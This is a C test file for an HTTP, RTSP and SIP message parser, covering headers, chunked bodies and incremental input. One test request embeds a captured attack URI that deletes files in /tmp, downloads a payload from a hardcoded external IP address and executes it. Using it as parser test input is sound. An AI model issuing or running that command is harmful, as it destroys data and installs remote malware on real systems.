#include "http-parser.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include "time64.h"

#if defined(OS_RTOS)
#define N 100
#else
#define N 10000
#endif

static void http_request_test(void)
{
	static const char* s = "GET / HTTP/1.1\r\n" \
		"Host: www.baidu.com\r\n" \
		"Date: Mon, Jun 26 2017 18:38:09 GMT\r\n" \
		"\r\n";

	size_t n;
	int major, minor;
	char protocol[64];
	http_parser_t* parser;

	n = strlen(s);
	parser = http_parser_create(HTTP_PARSER_REQUEST, NULL, NULL);
	assert(0 == http_parser_input(parser, s, &n));
	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
	assert(0 == strcmp(http_get_request_uri(parser), "/"));
	assert(0 == strcmp(http_get_request_method(parser), "GET"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Host"), "www.baidu.com"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Date"), "Mon, Jun 26 2017 18:38:09 GMT"));
	http_parser_destroy(parser);
}

static void http_request_test2(void)
{
	static const char* s = "GET /shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q\r\n";

	size_t n;
	int major, minor;
	char protocol[64];
	http_parser_t* parser;

	n = strlen(s);
	parser = http_parser_create(HTTP_PARSER_REQUEST, NULL, NULL);
	assert(1 /*INPUT_HEADER*/ == http_parser_input(parser, s, &n));
	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
	assert(0 == strcmp(http_get_request_uri(parser), "/shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws"));
	assert(0 == strcmp(http_get_request_method(parser), "GET"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Host"), "127.0.0.1:80"));
	assert(0 == strcmp(http_get_header_by_name(parser, "User-Agent"), "Hello, world"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Accept"), "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q"));
	http_parser_destroy(parser);
}

static void http_chunk_test(void)
{
	static const char s[] = { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4f
	, 0x4b, 0x0d, 0x0a, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x3a, 0x20, 0x4d, 0x69, 0x63
	, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2d, 0x49, 0x49, 0x53, 0x2f, 0x35, 0x2e, 0x31
	, 0x2e, 0x31, 0x37, 0x2e, 0x37, 0x0d, 0x0a, 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20, 0x4d
	, 0x6f, 0x6e, 0x2c, 0x20, 0x30, 0x33, 0x20, 0x46, 0x65, 0x62, 0x20, 0x32, 0x30, 0x32
	, 0x30, 0x20, 0x30, 0x33, 0x3a, 0x33, 0x36, 0x3a, 0x34, 0x30, 0x20, 0x47, 0x4d, 0x54
	, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65
	, 0x3a, 0x20, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f
	, 0x6f, 0x63, 0x74, 0x65, 0x74, 0x2d, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6d, 0x0d, 0x0a
	, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x65, 0x72, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64
	, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x63, 0x68, 0x75, 0x6e, 0x6b, 0x65, 0x64, 0x0d, 0x0a
	, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c
	, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54
	, 0x79, 0x70, 0x65, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x70, 0x6c, 0x61, 0x69
	, 0x6e, 0x0d, 0x0a, 0x0d, 0x0a, 0x33, 0x30, 0x0d, 0x0a, 0x64, 0x38, 0x3a, 0x69, 0x6e
	, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c, 0x69, 0x33, 0x36, 0x30, 0x30, 0x65, 0x31, 0x32
	, 0x3a, 0x6d, 0x69, 0x6e, 0x20, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c, 0x69
	, 0x31, 0x38, 0x30, 0x30, 0x65, 0x35, 0x3a, 0x70, 0x65, 0x65, 0x72, 0x73, 0x30, 0x3a
	, 0x65, 0x0d, 0x0a, 0x30, 0x0d, 0x0a, 0x0d, 0x0a };

	size_t n;
	int major, minor;
	char protocol[64];
	http_parser_t* parser;

	n = sizeof(s);
	parser = http_parser_create(HTTP_PARSER_RESPONSE, NULL, NULL);
	assert(0 == http_parser_input(parser, s, &n));
	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
	assert(200 == http_get_status_code(parser));
	assert(0 == strcmp(http_get_header_by_name(parser, "Transfer-Encoding"), "chunked"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Connection"), "close"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Server"), "Microsoft-IIS/5.1.17.7"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Date"), "Mon, 03 Feb 2020 03:36:40 GMT"));
	http_parser_destroy(parser);
}

static void rtsp_response_test(void)
{
	static const char* s = "RTSP/1.0 200 OK\r\n" \
		"CSeq: 2\r\n" \
		"Date: Mon, Jun 26 2017 18:38:09 GMT\r\n" \
		"Transport: RTP/AVP;unicast;destination=192.168.31.1;source=192.168.31.132;client_port=33900-33901;server_port=6970-6971\r\n" \
		"Session: 93C429BE;timeout=65\r\n" \
		"\r\n";

	size_t n;
	int major, minor;
	char protocol[64];
	http_parser_t* parser;

	n = strlen(s);
	parser = http_parser_create(HTTP_PARSER_RESPONSE, NULL, NULL);
	assert(0 == http_parser_input(parser, s, &n));
	assert(200 == http_get_status_code(parser));
	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 0 == minor && 0 == strcmp("RTSP", protocol));
	assert(0 == strcmp(http_get_header_by_name(parser, "CSeq"), "2"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Date"), "Mon, Jun 26 2017 18:38:09 GMT"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Transport"), "RTP/AVP;unicast;destination=192.168.31.1;source=192.168.31.132;client_port=33900-33901;server_port=6970-6971"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Session"), "93C429BE;timeout=65"));
	http_parser_destroy(parser);
}

static void sip_request_test(void)
{
	const char* s = "INVITE sip:bob@biloxi.com SIP/2.0\r\n" \
		"Via: SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds\r\n" \
		"Max-Forwards: 70\r\n" \
		"To: Bob <sip:bob@biloxi.com>\r\n" \
		"From: Alice <sip:alice@atlanta.com>;tag=1928301774\r\n" \
		"Call-ID: a84b4c76e66710@pc33.atlanta.com\r\n" \
		"CSeq: 314159 INVITE\r\n" \
		"Contact: <sip:alice@pc33.atlanta.com>\r\n" \
		"Content-Type: application/sdp\r\n" \
		"Content-Length: 0\r\n" \
		"\r\n";

	size_t n;
	int major, minor;
	char protocol[64];
	http_parser_t* parser;

	n = strlen(s);
	parser = http_parser_create(HTTP_PARSER_REQUEST, NULL, NULL);
	assert(0 == http_parser_input(parser, s, &n));
	assert(0 == http_get_version(parser, protocol, &major, &minor) && 2 == major && 0 == minor && 0 == strcmp("SIP", protocol));
	assert(0 == strcmp(http_get_request_uri(parser), "sip:bob@biloxi.com"));
	assert(0 == strcmp(http_get_request_method(parser), "INVITE"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Via"), "SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Max-Forwards"), "70"));
	assert(0 == strcmp(http_get_header_by_name(parser, "To"), "Bob <sip:bob@biloxi.com>"));
	assert(0 == strcmp(http_get_header_by_name(parser, "From"), "Alice <sip:alice@atlanta.com>;tag=1928301774"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Call-ID"), "a84b4c76e66710@pc33.atlanta.com"));
	assert(0 == strcmp(http_get_header_by_name(parser, "CSeq"), "314159 INVITE"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Contact"), "<sip:alice@pc33.atlanta.com>"));
	assert(0 == strcmp(http_get_content_type(parser), "application/sdp"));
	assert(0 == http_get_content_length(parser));
	http_parser_destroy(parser);
}

static void sip_response_test(void)
{
	const char* s = "SIP/2.0 200 OK\r\n" \
		"Via: SIP/2.0/UDP server10.biloxi.com;branch=z9hG4bKnashds8;received=192.0.2.3\r\n" \
		"Via: SIP/2.0/UDP bigbox3.site3.atlanta.com;branch=z9hG4bK77ef4c2312983.1;received=192.0.2.2\r\n" \
		"Via: SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds ;received=192.0.2.1\r\n" \
		"To: Bob <sip:bob@biloxi.com>;tag=a6c85cf\r\n" \
		"From: Alice <sip:alice@atlanta.com>;tag=1928301774\r\n" \
		"Call-ID: a84b4c76e66710@pc33.atlanta.com\r\n" \
		"CSeq: 314159 INVITE\r\n" \
		"Contact: <sip:bob@192.0.2.4>\r\n" \
		"Content-Type: application/sdp\r\n" \
		"Content-Length: 0\r\n" \
		"\r\n";

	size_t n;
	int major, minor;
	const char *name, *value;
	char protocol[64];
	http_parser_t* parser;

	n = strlen(s);
	parser = http_parser_create(HTTP_PARSER_RESPONSE, NULL, NULL);
	assert(0 == http_parser_input(parser, s, &n));
	assert(0 == http_get_version(parser, protocol, &major, &minor) && 2 == major && 0 == minor && 0 == strcmp("SIP", protocol));
	assert(200 == http_get_status_code(parser));
	assert(0 == http_get_header(parser, 0, &name, &value) && 0 == strcmp("Via", name) && 0 == strcmp("SIP/2.0/UDP server10.biloxi.com;branch=z9hG4bKnashds8;received=192.0.2.3", value));
	assert(0 == http_get_header(parser, 1, &name, &value) && 0 == strcmp("Via", name) && 0 == strcmp("SIP/2.0/UDP bigbox3.site3.atlanta.com;branch=z9hG4bK77ef4c2312983.1;received=192.0.2.2", value));
	assert(0 == http_get_header(parser, 2, &name, &value) && 0 == strcmp("Via", name) && 0 == strcmp("SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds ;received=192.0.2.1", value));
	assert(0 == strcmp(http_get_content_type(parser), "application/sdp"));
	http_parser_destroy(parser);
}

static void sip_payload(void* param, const void* data, int bytes)
{
	//printf("%.*s", bytes, (const char*)data);
}

static void sip_request_test2(void)
{
	const char* s = "INVITE sip:bob@biloxi.com SIP/2.0\r\n" \
		"Via: SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds\r\n" \
		"Max-Forwards: 70\r\n" \
		"To: Bob <sip:bob@biloxi.com>\r\n" \
		"From: Alice <sip:alice@atlanta.com>;tag=1928301774\r\n" \
		"Call-ID: a84b4c76e66710@pc33.atlanta.com\r\n" \
		"CSeq: 314159 INVITE\r\n" \
		"Contact: <sip:alice@pc33.atlanta.com>\r\n" \
		"Content-Type: application/sdp\r\n" \
		"Transfer-Encoding: chunked\r\n" \
		"\r\n" \
		"8\r\n12345678\r\n10\r\n1234567890123456\r\n0\r\n\r\n";

	size_t i, n, m;
	int major, minor;
	char protocol[64];
	http_parser_t* parser;

	parser = http_parser_create(HTTP_PARSER_REQUEST, sip_payload, NULL);
	for (i = 0; i < strlen(s); i+=m)
	{
		n = m = rand() % (strlen(s) - i + 1);
		assert(http_parser_input(parser, s+i, &n) >= 0 && 0 == n);
	}
	assert(0 == http_get_version(parser, protocol, &major, &minor) && 2 == major && 0 == minor && 0 == strcmp("SIP", protocol));
	assert(0 == strcmp(http_get_request_uri(parser), "sip:bob@biloxi.com"));
	assert(0 == strcmp(http_get_request_method(parser), "INVITE"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Via"), "SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Max-Forwards"), "70"));
	assert(0 == strcmp(http_get_header_by_name(parser, "To"), "Bob <sip:bob@biloxi.com>"));
	assert(0 == strcmp(http_get_header_by_name(parser, "From"), "Alice <sip:alice@atlanta.com>;tag=1928301774"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Call-ID"), "a84b4c76e66710@pc33.atlanta.com"));
	assert(0 == strcmp(http_get_header_by_name(parser, "CSeq"), "314159 INVITE"));
	assert(0 == strcmp(http_get_header_by_name(parser, "Contact"), "<sip:alice@pc33.atlanta.com>"));
	assert(0 == strcmp(http_get_content_type(parser), "application/sdp"));
	assert(-1 == http_get_content_length(parser));
	http_parser_destroy(parser);
}

void http_parser_test(void)
{
	int i;
	http_request_test();
	http_request_test2();
	http_chunk_test();
	rtsp_response_test();
	sip_response_test();

	srand((unsigned int)time64_now());
	for (i = 0; i < N; i++)
		sip_request_test2();
}

static void http_parser_test_ondata(void* param, const void* data, int len)
{
	fwrite(data, 1, len, (FILE*)param);
}

void http_parser_test2(const char* responseFile)
{
	int r;
	size_t n;
	int major, minor;
	char protocol[64];
	char buffer[2 * 1024];
	http_parser_t* parser;

	FILE* rfp = fopen(responseFile, "rb");
	FILE* wfp = fopen("1.raw", "wb");

	parser = http_parser_create(HTTP_PARSER_RESPONSE, http_parser_test_ondata, wfp);
	n = fread(buffer, 1, sizeof(buffer), rfp);
	while (n > 0)
	{
		r = http_parser_input(parser, buffer, &n);
		assert(r >= 0 && 0 == n);
		if (r == 0 || r == 2)
		{
			assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
			assert(200 == http_get_status_code(parser));
			assert(0 == strcmp(http_get_header_by_name(parser, "Transfer-Encoding"), "chunked"));
			assert(0 == strcmp(http_get_header_by_name(parser, "Connection"), "close"));
		}
		n = fread(buffer, 1, sizeof(buffer), rfp);
	}
	http_parser_destroy(parser);

	fclose(rfp);
	fclose(wfp);
}
